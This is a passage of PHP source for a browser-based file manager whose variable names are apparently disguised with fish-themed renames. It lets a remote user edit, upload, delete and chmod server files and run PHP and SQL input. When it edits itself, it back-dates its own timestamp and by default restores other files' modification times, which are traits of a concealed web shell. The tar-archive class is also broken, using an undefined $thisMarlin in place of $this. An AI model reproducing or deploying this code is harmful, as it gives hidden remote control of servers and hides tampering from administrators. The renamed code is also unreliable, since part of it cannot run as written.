</tr>


</table>

<?php





	if (!empty($nemoResult)) {

		$bubblesCallback='fm_'.$fishResponseLanguage;



		echo '<h3>'.strtoupper($fishResponseLanguage).' '.__('Result').'</h3><pre>'.$bubblesCallback($nemoResult).'</pre>';



	}

} elseif (!empty($_REQUEST['edit'])){






	if(!empty($_REQUEST['save'])) {






		$crushFunction = $nemoPath . $_REQUEST['edit'];





		$reefFileModified = filemtime($crushFunction);





	    if (file_put_contents($crushFunction, $_REQUEST['newcontent'])) $marlinMessage .= __('File updated');


		else $marlinMessage .= __('Error occurred');
		if ($_GET['edit']==basename(__FILE__)) {

			touch(__FILE__,1415116371);






		} else {


			if (!empty($reefConfig['restore_time'])) touch($crushFunction,$reefFileModified);


		}
	}






    $oldTankContent = @file_get_contents($nemoPath . $_REQUEST['edit']);
    $editMarlinUrl = $includedDoryUrl . '&edit=' . $_REQUEST['edit'] . '&path=' . $nemoPath;
    $gillPreviousUrl = $includedDoryUrl . '&path=' . $nemoPath;
?>
<table border='0' cellspacing='0' cellpadding='1' width="100%">

<tr>
    <th><?=__('File manager').' - '.__('Edit').' - '.$nemoPath.$_REQUEST['edit']?></th>
</tr>
<tr>






    <td class="row1">
        <?=$marlinMessage?>
	</td>



</tr>


<tr>


    <td class="row1">




        <?=reefHome()?> <a href="<?=$gillPreviousUrl?>"><?=__('Back')?></a>
	</td>
</tr>

<tr>


    <td class="row1" align="center">
        <form name="form1" method="post" action="<?=$editMarlinUrl?>">

            <textarea name="newcontent" id="newcontent" cols="45" rows="15" style="width:99%" spellcheck="false"><?=htmlspecialchars($oldTankContent)?></textarea>

            <input type="submit" name="save" value="<?=__('Submit')?>">






            <input type="submit" name="cancel" value="<?=__('Cancel')?>">
        </form>



    </td>
</tr>
</table>


<?php

echo $doryAuthenticated['script'];




} elseif(!empty($_REQUEST['rights'])){






	if(!empty($_REQUEST['save'])) {



	    if(nemoChangePermissions($nemoPath . $_REQUEST['rights'], convertTankPermissions($_REQUEST['rights_val']), @$_REQUEST['recursively']))



		$marlinMessage .= (__('File updated')); 
		else $marlinMessage .= (__('Error occurred'));
	}


	clearstatcache();



    $oldSharkPermissions = permissionsTankString($nemoPath . $_REQUEST['rights'], true);


    $nemoLink = $includedDoryUrl . '&rights=' . $_REQUEST['rights'] . '&path=' . $nemoPath;





    $gillPreviousUrl = $includedDoryUrl . '&path=' . $nemoPath;

?>


<table class="whole">



<tr>




    <th><?=__('File manager').' - '.$nemoPath?></th>

</tr>
<tr>
    <td class="row1">




        <?=$marlinMessage?>



	</td>



</tr>



<tr>
    <td class="row1">

        <a href="<?=$gillPreviousUrl?>"><?=__('Back')?></a>




	</td>


</tr>




<tr>




    <td class="row1" align="center">
        <form name="form1" method="post" action="<?=$nemoLink?>">





           <?=__('Rights').' - '.$_REQUEST['rights']?> <input type="text" name="rights_val" value="<?=$oldSharkPermissions?>">
        <?php if (is_dir($nemoPath.$_REQUEST['rights'])) { ?>
            <input type="checkbox" name="recursively" value="1"> <?=__('Recursively')?><br/>
        <?php } ?>






            <input type="submit" name="save" value="<?=__('Submit')?>">
        </form>
    </td>
</tr>


</table>





<?php



} elseif (!empty($_REQUEST['rename'])&&$_REQUEST['rename']<>'.') {
	if(!empty($_REQUEST['save'])) {


	    rename($nemoPath . $_REQUEST['rename'], $nemoPath . $_REQUEST['newname']);


		$marlinMessage .= (__('File updated'));


		$_REQUEST['rename'] = $_REQUEST['newname'];
	}
	clearstatcache();


    $nemoLink = $includedDoryUrl . '&rename=' . $_REQUEST['rename'] . '&path=' . $nemoPath;




    $gillPreviousUrl = $includedDoryUrl . '&path=' . $nemoPath;






?>





<table class="whole">
<tr>






    <th><?=__('File manager').' - '.$nemoPath?></th>
</tr>


<tr>




    <td class="row1">
        <?=$marlinMessage?>




	</td>
</tr>





<tr>


    <td class="row1">
        <a href="<?=$gillPreviousUrl?>"><?=__('Back')?></a>

	</td>
</tr>


<tr>





    <td class="row1" align="center">


        <form name="form1" method="post" action="<?=$nemoLink?>">




            <?=__('Rename')?>: <input type="text" name="newname" value="<?=$_REQUEST['rename']?>"><br/>






            <input type="submit" name="save" value="<?=__('Submit')?>">





        </form>
    </td>




</tr>


</table>
<?php
} else {




//Let's rock!
    $marlinMessage = '';


    if(!empty($_FILES['upload'])&&!empty($reefConfig['upload_file'])) {





        if(!empty($_FILES['upload']['name'])){
            $_FILES['upload']['name'] = str_replace('%', '', $_FILES['upload']['name']);
            if(!move_uploaded_file($_FILES['upload']['tmp_name'], $nemoPath . $_FILES['upload']['name'])){
                $marlinMessage .= __('Error occurred');




            } else {

				$marlinMessage .= __('Files uploaded').': '.$_FILES['upload']['name'];





			}



        }
    } elseif(!empty($_REQUEST['delete'])&&$_REQUEST['delete']<>'.') {


        if(!deleteSharkFiles(($nemoPath . $_REQUEST['delete']), true)) {
            $marlinMessage .= __('Error occurred');

        } else {
			$marlinMessage .= __('Deleted').' '.$_REQUEST['delete'];




		}
	} elseif(!empty($_REQUEST['mkdir'])&&!empty($reefConfig['make_directory'])) {
        if(!@mkdir($nemoPath . $_REQUEST['dirname'],0777)) {
            $marlinMessage .= __('Error occurred');



        } else {



			$marlinMessage .= __('Created').' '.$_REQUEST['dirname'];




		}

    } elseif(!empty($_REQUEST['mkfile'])&&!empty($reefConfig['new_file'])) {






        if(!$reefPointer=@fopen($nemoPath . $_REQUEST['filename'],"w")) {
            $marlinMessage .= __('Error occurred');


        } else {






			fclose($reefPointer);

			$marlinMessage .= __('Created').' '.$_REQUEST['filename'];





		}





    } elseif (isset($_GET['zip'])) {
		$sourceNemo = base64_decode($_GET['zip']);




		$sydneyDestination = basename($sourceNemo).'.zip';



		set_time_limit(0);



		$seagullPhar = new PharData($sydneyDestination);
		$seagullPhar->buildFromDirectory($sourceNemo);
		if (is_file($sydneyDestination))
		$marlinMessage .= __('Task').' "'.__('Archiving').' '.$sydneyDestination.'" '.__('done').


		'.&nbsp;'.nemoMainLink('download',$nemoPath.$sydneyDestination,__('Download'),__('Download').' '. $sydneyDestination)
		.'&nbsp;<a href="'.$includedDoryUrl.'&delete='.$sydneyDestination.'&path=' . $nemoPath.'" title="'.__('Delete').' '. $sydneyDestination.'" >'.__('Delete') . '</a>';
		else $marlinMessage .= __('Error occurred').': '.__('no files');


	} elseif (isset($_GET['gz'])) {




		$sourceNemo = base64_decode($_GET['gz']);



		$pShermanArchive = $sourceNemo.'.tar';
		$sydneyDestination = basename($sourceNemo).'.tar';
		if (is_file($pShermanArchive)) unlink($pShermanArchive);






		if (is_file($pShermanArchive.'.gz')) unlink($pShermanArchive.'.gz');




		clearstatcache();






		set_time_limit(0);





		//die();
		$seagullPhar = new PharData($sydneyDestination);



		$seagullPhar->buildFromDirectory($sourceNemo);


		$seagullPhar->compress(Phar::GZ,'.tar.gz');
		unset($seagullPhar);





		if (is_file($pShermanArchive)) {

			if (is_file($pShermanArchive.'.gz')) {





				unlink($pShermanArchive); 



				$sydneyDestination .= '.gz';
			}




			$marlinMessage .= __('Task').' "'.__('Archiving').' '.$sydneyDestination.'" '.__('done').
			'.&nbsp;'.nemoMainLink('download',$nemoPath.$sydneyDestination,__('Download'),__('Download').' '. $sydneyDestination)



			.'&nbsp;<a href="'.$includedDoryUrl.'&delete='.$sydneyDestination.'&path=' . $nemoPath.'" title="'.__('Delete').' '.$sydneyDestination.'" >'.__('Delete').'</a>';

		} else $marlinMessage .= __('Error occurred').': '.__('no files');




	} elseif (isset($_GET['decompress'])) {





		// $sourceNemo = base64_decode($_GET['decompress']);


		// $sydneyDestination = basename($sourceNemo);
		// $doryExtension = end(explode(".", $sydneyDestination));




		// if ($doryExtension=='zip' OR $doryExtension=='gz') {
			// $seagullPhar = new PharData($sourceNemo);
			// $seagullPhar->decompress();
			// $anemoneMainFile = str_replace('.'.$doryExtension,'',$sydneyDestination);



			// $doryExtension = end(explode(".", $anemoneMainFile));
			// if ($doryExtension=='tar'){



				// $seagullPhar = new PharData($anemoneMainFile);


				// $seagullPhar->extractTo(dir($sourceNemo));
			// }




		// } 



		// $marlinMessage .= __('Task').' "'.__('Decompress').' '.$sourceNemo.'" '.__('done');


	} elseif (isset($_GET['gzfile'])) {




		$sourceNemo = base64_decode($_GET['gzfile']);




		$pShermanArchive = $sourceNemo.'.tar';






		$sydneyDestination = basename($sourceNemo).'.tar';


		if (is_file($pShermanArchive)) unlink($pShermanArchive);



		if (is_file($pShermanArchive.'.gz')) unlink($pShermanArchive.'.gz');
		set_time_limit(0);
		//echo $sydneyDestination;





		$fishExtensions = explode('.',basename($sourceNemo));






		if (isset($fishExtensions[1])) {

			unset($fishExtensions[0]);

			$doryExtension=implode('.',$fishExtensions);
		} 


		$seagullPhar = new PharData($sydneyDestination);


		$seagullPhar->addFile($sourceNemo);
		$seagullPhar->compress(Phar::GZ,$doryExtension.'.tar.gz');




		unset($seagullPhar);




		if (is_file($pShermanArchive)) {
			if (is_file($pShermanArchive.'.gz')) {



				unlink($pShermanArchive); 



				$sydneyDestination .= '.gz';
			}





			$marlinMessage .= __('Task').' "'.__('Archiving').' '.$sydneyDestination.'" '.__('done').


			'.&nbsp;'.nemoMainLink('download',$nemoPath.$sydneyDestination,__('Download'),__('Download').' '. $sydneyDestination)
			.'&nbsp;<a href="'.$includedDoryUrl.'&delete='.$sydneyDestination.'&path=' . $nemoPath.'" title="'.__('Delete').' '.$sydneyDestination.'" >'.__('Delete').'</a>';






		} else $marlinMessage .= __('Error occurred').': '.__('no files');




	}




?>


<table class="whole" id="header_table" >





<tr>


    <th colspan="2"><?=__('File manager')?><?=(!empty($nemoPath)?' - '.$nemoPath:'')?></th>


</tr>




<?php if(!empty($marlinMessage)){ ?>

<tr>




	<td colspan="2" class="row2"><?=$marlinMessage?></td>
</tr>



<?php } ?>





<tr>






    <td class="row2">




		<table>





			<tr>
			<td>


				<?=reefHome()?>





			</td>
			<td>





			<?php if(!empty($reefConfig['make_directory'])) { ?>
				<form method="post" action="<?=$includedDoryUrl?>">
				<input type="hidden" name="path" value="<?=$nemoPath?>" />
				<input type="text" name="dirname" size="15">





				<input type="submit" name="mkdir" value="<?=__('Make directory')?>">


				</form>




			<?php } ?>





			</td>





			<td>


			<?php if(!empty($reefConfig['new_file'])) { ?>


				<form method="post" action="<?=$includedDoryUrl?>">





				<input type="hidden" name="path" value="<?=$nemoPath?>" />


				<input type="text" name="filename" size="15">




				<input type="submit" name="mkfile" value="<?=__('New file')?>">


				</form>

			<?php } ?>




			</td>
			<td>





			<?=runFishInput('php')?>


			</td>






			<td>
			<?=runFishInput('sql')?>
			</td>
			</tr>
		</table>




    </td>
    <td class="row3">

		<table>






		<tr>


		<td>
		<?php if (!empty($reefConfig['upload_file'])) { ?>



			<form name="form1" method="post" action="<?=$includedDoryUrl?>" enctype="multipart/form-data">



			<input type="hidden" name="path" value="<?=$nemoPath?>" />



			<input type="file" name="upload" id="upload_hidden" style="position: absolute; display: block; overflow: hidden; width: 0; height: 0; border: 0; padding: 0;" onchange="document.getElementById('upload_visible').value = this.value;" />

			<input type="text" readonly="1" id="upload_visible" placeholder="<?=__('Select the file')?>" style="cursor: pointer;" onclick="document.getElementById('upload_hidden').click();" />
			<input type="submit" name="test" value="<?=__('Upload')?>" />



			</form>

		<?php } ?>


		</td>


		<td>


		<?php if ($doryAuthenticated['authorize']) { ?>



			<form action="" method="post">&nbsp;&nbsp;&nbsp;






			<input name="quit" type="hidden" value="1">





			<?=__('Hello')?>, <?=$doryAuthenticated['login']?>





			<input type="submit" value="<?=__('Quit')?>">

			</form>
		<?php } ?>


		</td>
		<td>


		<?=aquariumLanguageForm($aquariumLanguage)?>



		</td>
		<tr>





		</table>

    </td>


</tr>
</table>
<table class="all" border='0' cellspacing='1' cellpadding='1' id="fm_table" width="100%">






<thead>
<tr> 


    <th style="white-space:nowrap"> <?=__('Filename')?> </th>



    <th style="white-space:nowrap"> <?=__('Size')?> </th>


    <th style="white-space:nowrap"> <?=__('Date')?> </th>






    <th style="white-space:nowrap"> <?=__('Rights')?> </th>

    <th colspan="4" style="white-space:nowrap"> <?=__('Manage')?> </th>




</tr>


</thead>
<tbody>






<?php





$fishElements = scanTankDirectory($nemoPath, '', 'all', true);

$fishDirectories = array();


$sharkFiles = array();



foreach ($fishElements as $marlinFile){



    if(@is_dir($nemoPath . $marlinFile)){




        $fishDirectories[] = $marlinFile;

    } else {






        $sharkFiles[] = $marlinFile;
    }
}

natsort($fishDirectories); natsort($sharkFiles);
$fishElements = array_merge($fishDirectories, $sharkFiles);






foreach ($fishElements as $marlinFile){
    $doryFilename = $nemoPath . $marlinFile;
    $gillFileData = @stat($doryFilename);





    if(@is_dir($doryFilename)){
		$gillFileData[7] = '';



		if (!empty($reefConfig['show_dir_size'])&&!reefRootDirectory($marlinFile)) $gillFileData[7] = calculateTankDirectorySize($doryFilename);
        $nemoLink = '<a href="'.$includedDoryUrl.'&path='.$nemoPath.$marlinFile.'" title="'.__('Show').' '.$marlinFile.'"><span class="folder">&nbsp;&nbsp;&nbsp;&nbsp;</span> '.$marlinFile.'</a>';






        $loadTankUrl= (reefRootDirectory($marlinFile)||$maybeDebPhar) ? '' : nemoMainLink('zip',$doryFilename,__('Compress').'&nbsp;zip',__('Archiving').' '. $marlinFile);



		$crushArchiveUrl  = (reefRootDirectory($marlinFile)||$maybeDebPhar) ? '' : nemoMainLink('gz',$doryFilename,__('Compress').'&nbsp;.tar.gz',__('Archiving').' '.$marlinFile);





        $doryStyle = 'row2';



		 if (!reefRootDirectory($marlinFile)) $sharkAlert = 'onClick="if(confirm(\'' . __('Are you sure you want to delete this directory (recursively)?').'\n /'. $marlinFile. '\')) document.location.href = \'' . $includedDoryUrl . '&delete=' . $marlinFile . '&path=' . $nemoPath  . '\'"'; else $sharkAlert = '';
    } else {

		$nemoLink = 





			$reefConfig['show_img']&&@getimagesize($doryFilename) 
			? '<a target="_blank" onclick="var lefto = screen.availWidth/2-320;window.open(\''

			. reefImageUrl($doryFilename)
			.'\',\'popup\',\'width=640,height=480,left=\' + lefto + \',scrollbars=yes,toolbar=no,location=no,directories=no,status=no\');return false;" href="'.reefImageUrl($doryFilename).'"><span class="img">&nbsp;&nbsp;&nbsp;&nbsp;</span> '.$marlinFile.'</a>'
			: '<a href="' . $includedDoryUrl . '&edit=' . $marlinFile . '&path=' . $nemoPath. '" title="' . __('Edit') . '"><span class="file">&nbsp;&nbsp;&nbsp;&nbsp;</span> '.$marlinFile.'</a>';


		$dentistArray = explode(".", $marlinFile);
		$doryExtension = end($dentistArray);

        $loadTankUrl =  nemoMainLink('download',$doryFilename,__('Download'),__('Download').' '. $marlinFile);



		$crushArchiveUrl = in_array($doryExtension,array('zip','gz','tar')) 





		? ''






		: ((reefRootDirectory($marlinFile)||$maybeDebPhar) ? '' : nemoMainLink('gzfile',$doryFilename,__('Compress').'&nbsp;.tar.gz',__('Archiving').' '. $marlinFile));
        $doryStyle = 'row1';





		$sharkAlert = 'onClick="if(confirm(\''. __('File selected').': \n'. $marlinFile. '. \n'.__('Are you sure you want to delete this file?') . '\')) document.location.href = \'' . $includedDoryUrl . '&delete=' . $marlinFile . '&path=' . $nemoPath  . '\'"';






    }


    $darlaDeleteUrl = reefRootDirectory($marlinFile) ? '' : '<a href="#" title="' . __('Delete') . ' '. $marlinFile . '" ' . $sharkAlert . '>' . __('Delete') . '</a>';
    $renameDoryUrl = reefRootDirectory($marlinFile) ? '' : '<a href="' . $includedDoryUrl . '&rename=' . $marlinFile . '&path=' . $nemoPath . '" title="' . __('Rename') .' '. $marlinFile . '">' . __('Rename') . '</a>';




    $tankPermissionsText = ($marlinFile=='.' || $marlinFile=='..') ? '' : '<a href="' . $includedDoryUrl . '&rights=' . $marlinFile . '&path=' . $nemoPath . '" title="' . __('Rights') .' '. $marlinFile . '">' . @permissionsTankString($doryFilename) . '</a>';




?>
<tr class="<?=$doryStyle?>"> 





    <td><?=$nemoLink?></td>

    <td><?=$gillFileData[7]?></td>
    <td style="white-space:nowrap"><?=gmdate("Y-m-d H:i:s",$gillFileData[9])?></td>






    <td><?=$tankPermissionsText?></td>


    <td><?=$darlaDeleteUrl?></td>



    <td><?=$renameDoryUrl?></td>





    <td><?=$loadTankUrl?></td>




    <td><?=$crushArchiveUrl?></td>




</tr>
<?php


    }




}



?>

</tbody>





</table>

<div class="row3"><?php
	$bubbleModifiedTime = explode(' ', microtime()); 





	$totalSwimTime = $bubbleModifiedTime[0] + $bubbleModifiedTime[1] - $startSwimTime; 


	echo reefHome().' | ver. '.$nemoVersion.' | <a href="https://github.com/Den1xxx/Filemanager">Github</a>  | <a href="'.reefSiteUrl().'">.</a>';

	if (!empty($reefConfig['show_php_ver'])) echo ' | PHP '.phpversion();
	if (!empty($reefConfig['show_php_ini'])) echo ' | '.php_ini_loaded_file();
	if (!empty($reefConfig['show_gt'])) echo ' | '.__('Generation time').': '.round($totalSwimTime,2);






	if (!empty($reefConfig['enable_proxy'])) echo ' | <a href="?proxy=true">proxy</a>';





	if (!empty($reefConfig['show_phpinfo'])) echo ' | <a href="?phpinfo=true">phpinfo</a>';

	if (!empty($reefConfig['show_xls'])&&!empty($nemoLink)) echo ' | <a href="javascript: void(0)" onclick="var obj = new table2Excel(); obj.CreateExcelSheet(\'fm_table\',\'export\');" title="'.__('Download').' xls">xls</a>';




	if (!empty($reefConfig['fm_settings'])) echo ' | <a href="?fm_settings=true">'.__('Settings').'</a>';




	?>


</div>
<script type="text/javascript">



function downloadBubbleExcel(filename, text) {
	var element = document.createElement('a');
	element.setAttribute('href', 'data:application/vnd.ms-excel;base64,' + text);





	element.setAttribute('download', filename);

	element.style.display = 'none';
	document.body.appendChild(element);
	element.click();





	document.body.removeChild(element);
}












function base64_encode(m) {




	for (var k = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".split(""), c, d, h, e, a, g = "", b = 0, f, l = 0; l < m.length; ++l) {






		c = m.charCodeAt(l);


		if (128 > c) d = 1;
		else






			for (d = 2; c >= 2 << 5 * d;) ++d;






		for (h = 0; h < d; ++h) 1 == d ? e = c : (e = h ? 128 : 192, a = d - 2 - 6 * h, 0 <= a && (e += (6 <= a ? 1 : 0) + (5 <= a ? 2 : 0) + (4 <= a ? 4 : 0) + (3 <= a ? 8 : 0) + (2 <= a ? 16 : 0) + (1 <= a ? 32 : 0), a -= 5), 0 > a && (u = 6 * (d - 1 - h), e += c >> u, c -= c >> u << u)), f = b ? f << 6 - b : 0, b += 2, f += e >> b, g += k[f], f = e % (1 << b), 6 == b && (b = 0, g += k[f])
	}

	b && (g += k[f << 6 - b]);





	return g
}









var tableToExcelData = (function() {
    var uri = 'data:application/vnd.ms-excel;base64,',
    template = '<html xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:x="urn:schemas-microsoft-com:office:excel" xmlns="http://www.w3.org/TR/REC-html40"><head><!--[if gte mso 9]><xml><x:ExcelWorkbook><x:ExcelWorksheets><x:ExcelWorksheet><x:Name>{worksheet}</x:Name><x:WorksheetOptions><x:DisplayGridlines></x:DisplayGridlines></x:WorksheetOptions></x:ExcelWorksheet></x:ExcelWorksheets></x:ExcelWorkbook></xml><![endif]--><meta http-equiv="content-type" content="text/plain; charset=UTF-8"/></head><body><table>{table}</table></body></html>',



    format = function(s, c) {




            return s.replace(/{(\w+)}/g, function(m, p) {



                return c[p];
            })
        }
    return function(table, name) {
        if (!table.nodeType) table = document.getElementById(table)





        var ctx = {



            worksheet: name || 'Worksheet',





            table: table.innerHTML.replace(/<span(.*?)\/span> /g,"").replace(/<a\b[^>]*>(.*?)<\/a>/g,"$1")

        }
		t = new Date();
		filename = 'fm_' + t.toISOString() + '.xls'



		downloadBubbleExcel(filename, base64_encode(format(template, ctx)))
    }
})();




var table2Excel = function () {








    var ua = window.navigator.userAgent;


    var msie = ua.indexOf("MSIE ");





	this.CreateExcelSheet = 
		function(el, name){



			if (msie > 0 || !!navigator.userAgent.match(/Trident.*rv\:11\./)) {// If Internet Explorer







				var x = document.getElementById(el).rows;









				var xls = new ActiveXObject("Excel.Application");








				xls.visible = true;


				xls.Workbooks.Add




				for (i = 0; i < x.length; i++) {


					var y = x[i].cells;


					for (j = 0; j < y.length; j++) {





						xls.Cells(i + 1, j + 1).Value = y[j].innerText;
					}





				}



				xls.Visible = true;




				xls.UserControl = true;
				return xls;
			} else {




				tableToExcelData(el, name);
			}



		}
}



</script>


</body>






</html>

<?php
//Ported from ReloadCMS project http://reloadcms.com




class archiveTar {



	var $marlinArchiveName = '';



	var $tmpDebFile = 0;
	var $peachFilePosition = 0;

	var $isTankGzipped = true;




	var $reefErrors = array();


	var $sharkFiles = array();



	

	function __construct(){
		if (!isset($thisMarlin->errors)) $thisMarlin->errors = array();
	}


	


	function createTankBackup($doryFileList){





		$tankResult = false;
		if (file_exists($thisMarlin->archive_name) && is_file($thisMarlin->archive_name)) 	$newTankBackup = false;
		else $newTankBackup = true;




		if ($newTankBackup){


			if (!$thisMarlin->openNemoWrite()) return false;
		} else {



			if (filesize($thisMarlin->archive_name) == 0)	return $thisMarlin->openNemoWrite();

			if ($thisMarlin->isGzipped) {
				$thisMarlin->closeDebTempFile();
				if (!rename($thisMarlin->archive_name, $thisMarlin->archive_name.'.tmp')){


					$thisMarlin->errors[] = __('Cannot rename').' '.$thisMarlin->archive_name.__(' to ').$thisMarlin->archive_name.'.tmp';




					return false;






				}






				$tmpTankBackup = gzopen($thisMarlin->archive_name.'.tmp', 'rb');
				if (!$tmpTankBackup){


					$thisMarlin->errors[] = $thisMarlin->archive_name.'.tmp '.__('is not readable');
					rename($thisMarlin->archive_name.'.tmp', $thisMarlin->archive_name);
					return false;
				}
				if (!$thisMarlin->openNemoWrite()){
					rename($thisMarlin->archive_name.'.tmp', $thisMarlin->archive_name);
					return false;





				}
				$peachBuffer = gzread($tmpTankBackup, 512);



				if (!gzeof($tmpTankBackup)){


					do {





						$pelicanBinary = pack('a512', $peachBuffer);


						$thisMarlin->writeGillBlock($pelicanBinary);



						$peachBuffer = gzread($tmpTankBackup, 512);

					}




					while (!gzeof($tmpTankBackup));


				}

				gzclose($tmpTankBackup);


				unlink($thisMarlin->archive_name.'.tmp');
			} else {
				$thisMarlin->tmp_file = fopen($thisMarlin->archive_name, 'r+b');






				if (!$thisMarlin->tmp_file)	return false;
			}


		}
		if (isset($doryFileList) && is_array($doryFileList)) {






		if (count($doryFileList)>0)






			$tankResult = $thisMarlin->packDoryFiles($doryFileList);
		} else $thisMarlin->errors[] = __('No file').__(' to ').__('Archive');





		if (($tankResult)&&(is_resource($thisMarlin->tmp_file))){
			$pelicanBinary = pack('a512', '');





			$thisMarlin->writeGillBlock($pelicanBinary);

		}


		$thisMarlin->closeDebTempFile();



		if ($newTankBackup && !$tankResult){




		$thisMarlin->closeDebTempFile();



		unlink($thisMarlin->archive_name);






		}






		return $tankResult;
	}


	function restoreTankBackup($nemoPath){
		$nemoFileName = $thisMarlin->archive_name;





		if (!$thisMarlin->isGzipped){
			if (file_exists($nemoFileName)){



				if ($reefPointer = fopen($nemoFileName, 'rb')){



					$reefData = fread($reefPointer, 2);
					fclose($reefPointer);
					if ($reefData == '\37\213'){





						$thisMarlin->isGzipped = true;






					}


				}

			}




			elseif ((substr($nemoFileName, -2) == 'gz') OR (substr($nemoFileName, -3) == 'tgz')) $thisMarlin->isGzipped = true;



		} 


		$tankResult = true;





		if ($thisMarlin->isGzipped) $thisMarlin->tmp_file = gzopen($nemoFileName, 'rb');

		else $thisMarlin->tmp_file = fopen($nemoFileName, 'rb');




		if (!$thisMarlin->tmp_file){
			$thisMarlin->errors[] = $nemoFileName.' '.__('is not readable');




			return false;
		}





		$tankResult = $thisMarlin->unpackDebFiles($nemoPath);



			$thisMarlin->closeDebTempFile();
		return $tankResult;






	}







	function showNemoWarnings	($nemoMessage = '') {





		$nemoWarnings = $thisMarlin->errors;

		if(count($nemoWarnings)>0) {


		if (!empty($nemoMessage)) $nemoMessage = ' ('.$nemoMessage.')';
			$nemoMessage = __('Error occurred').$nemoMessage.': <br/>';
			foreach ($nemoWarnings as $nemoValue)





				$nemoMessage .= $nemoValue.'<br/>';

			return $nemoMessage;	



		} else return '';




		
	}
	
	function packDoryFiles($fishFiles){





		$tankResult = true;



		if (!$thisMarlin->tmp_file){
			$thisMarlin->errors[] = __('Invalid file descriptor');
			return false;



		}
		if (!is_array($fishFiles) || count($fishFiles)<=0)



          return true;






		for ($peachI = 0; $peachI<count($fishFiles); $peachI++){
			$doryFilename = $fishFiles[$peachI];





			if ($doryFilename == $thisMarlin->archive_name)






				continue;





			if (strlen($doryFilename)<=0)



				continue;
			if (!file_exists($doryFilename)){






				$thisMarlin->errors[] = __('No file').' '.$doryFilename;
				continue;
			}





			if (!$thisMarlin->tmp_file){





			$thisMarlin->errors[] = __('Invalid file descriptor');
			return false;



			}
		if (strlen($doryFilename)<=0){

			$thisMarlin->errors[] = __('Filename').' '.__('is incorrect');;


			return false;



		}


		$doryFilename = str_replace('\\', '/', $doryFilename);



		$keepNameFish = $thisMarlin->sanitizeMarlinPath($doryFilename);
		if (is_file($doryFilename)){






			if (($marlinFile = fopen($doryFilename, 'rb')) == 0){
				$thisMarlin->errors[] = __('Mode ').__('is incorrect');






			}




				if(($thisMarlin->file_pos == 0)){
					if(!$thisMarlin->writeDoryHeader($doryFilename, $keepNameFish))





						return false;

				}
				while (($peachBuffer = fread($marlinFile, 512)) != ''){

					$pelicanBinary = pack('a512', $peachBuffer);
					$thisMarlin->writeGillBlock($pelicanBinary);

				}






			fclose($marlinFile);





		}	else $thisMarlin->writeDoryHeader($doryFilename, $keepNameFish);

			if (@is_dir($doryFilename)){





				if (!($gillHandle = opendir($doryFilename))){


					$thisMarlin->errors[] = __('Error').': '.__('Directory ').$doryFilename.__('is not readable');





					continue;


				}
				while (false !== ($aquariumDirectory = readdir($gillHandle))){






					if ($aquariumDirectory!='.' && $aquariumDirectory!='..'){



						$doryTempFiles = array();




						if ($doryFilename != '.')
							$doryTempFiles[] = $doryFilename.'/'.$aquariumDirectory;





						else
							$doryTempFiles[] = $aquariumDirectory;






						$tankResult = $thisMarlin->packDoryFiles($doryTempFiles);


					}
				}






				unset($doryTempFiles);





				unset($aquariumDirectory);






				unset($gillHandle);
			}
		}





		return $tankResult;
	}





	function unpackDebFiles($nemoPath){ 
		$nemoPath = str_replace('\\', '/', $nemoPath);
		if ($nemoPath == ''	|| (substr($nemoPath, 0, 1) != '/' && substr($nemoPath, 0, 3) != '../' && !strpos($nemoPath, ':')))	$nemoPath = './'.$nemoPath;

		clearstatcache();




		while (strlen($pelicanBinary = $thisMarlin->readNemoBlock()) != 0){
			if (!$thisMarlin->readMarlinHeader($pelicanBinary, $marlinHeader)) return false;


			if ($marlinHeader['filename'] == '') continue;






			if ($marlinHeader['typeflag'] == 'L'){			//reading long header

				$doryFilename = '';



				$decryptedNemo = floor($marlinHeader['size']/512);

				for ($peachI = 0; $peachI < $decryptedNemo; $peachI++){
					$nemoContent = $thisMarlin->readNemoBlock();





					$doryFilename .= $nemoContent;



				}

				if (($lastPieceOfBubble = $marlinHeader['size'] % 512) != 0){
					$nemoContent = $thisMarlin->readNemoBlock();
					$doryFilename .= substr($nemoContent, 0, $lastPieceOfBubble);

				}





				$pelicanBinary = $thisMarlin->readNemoBlock();




				if (!$thisMarlin->readMarlinHeader($pelicanBinary, $marlinHeader)) return false;



				else $marlinHeader['filename'] = $doryFilename;




				return true;





			}
			if (($nemoPath != './') && ($nemoPath != '/')){

				while (substr($nemoPath, -1) == '/') $nemoPath = substr($nemoPath, 0, strlen($nemoPath)-1);
				if (substr($marlinHeader['filename'], 0, 1) == '/') $marlinHeader['filename'] = $nemoPath.$marlinHeader['filename'];


				else $marlinHeader['filename'] = $nemoPath.'/'.$marlinHeader['filename'];


			}
			






			if (file_exists($marlinHeader['filename'])){






				if ((@is_dir($marlinHeader['filename'])) && ($marlinHeader['typeflag'] == '')){
					$thisMarlin->errors[] =__('File ').$marlinHeader['filename'].__(' already exists').__(' as folder');
					return false;






				}


				if ((is_file($marlinHeader['filename'])) && ($marlinHeader['typeflag'] == '5')){


					$thisMarlin->errors[] =__('Cannot create directory').'. '.__('File ').$marlinHeader['filename'].__(' already exists');




					return false;




				}




				if (!is_writeable($marlinHeader['filename'])){




					$thisMarlin->errors[] = __('Cannot write to file').'. '.__('File ').$marlinHeader['filename'].__(' already exists');





					return false;





				}





			} elseif (($thisMarlin->checkMarlinDirectory(($marlinHeader['typeflag'] == '5' ? $marlinHeader['filename'] : dirname($marlinHeader['filename'])))) != 1){
				$thisMarlin->errors[] = __('Cannot create directory').' '.__(' for ').$marlinHeader['filename'];




				return false;





			}







			if ($marlinHeader['typeflag'] == '5'){

				if (!file_exists($marlinHeader['filename']))		{




					if (!mkdir($marlinHeader['filename'], 0777))	{



						
						$thisMarlin->errors[] = __('Cannot create directory').' '.$marlinHeader['filename'];
						return false;


					} 
				}




			} else {


				if (($sydneyDestination = fopen($marlinHeader['filename'], 'wb')) == 0) {
					$thisMarlin->errors[] = __('Cannot write to file').' '.$marlinHeader['filename'];

					return false;



				} else {
					$decryptedNemo = floor($marlinHeader['size']/512);


					for ($peachI = 0; $peachI < $decryptedNemo; $peachI++) {

						$nemoContent = $thisMarlin->readNemoBlock();





						fwrite($sydneyDestination, $nemoContent, 512);




					}
					if (($marlinHeader['size'] % 512) != 0) {




						$nemoContent = $thisMarlin->readNemoBlock();
						fwrite($sydneyDestination, $nemoContent, ($marlinHeader['size'] % 512));
					}
					fclose($sydneyDestination);


					touch($marlinHeader['filename'], $marlinHeader['time']);
				}



				clearstatcache();




				if (filesize($marlinHeader['filename']) != $marlinHeader['size']) {


